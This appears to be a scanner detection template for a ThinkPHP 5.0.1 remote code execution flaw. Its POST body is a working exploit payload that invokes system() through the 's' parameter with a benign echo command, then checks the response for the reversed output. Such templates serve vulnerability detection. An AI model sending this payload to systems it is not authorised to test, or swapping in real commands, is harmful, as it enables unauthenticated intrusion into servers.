id: thinkphp-501-rce

info:
  name: ThinkPHP 5.0.1 - Remote Code Execution
  author: lark-lab
  severity: critical
  verified: false
  description: ThinkPHP 5.0.1 allows remote unauthenticated attackers to  execute arbitrary code via the 's' parameter.
  reference:
    - https://www.exploit-db.com/exploits/46150
  tags: thinkphp,rce
  created: 2023/01/04
  
rules:
  r0:
    request:
      method: POST
      path: /?s=index/index/index
      body: "s=echo%20thinkphp%20%7C%20rev&_method=__construct&method&filter[]=system"
    expression: response.status == 200 && response.body.bcontains(b'phpkniht')
expression: r0()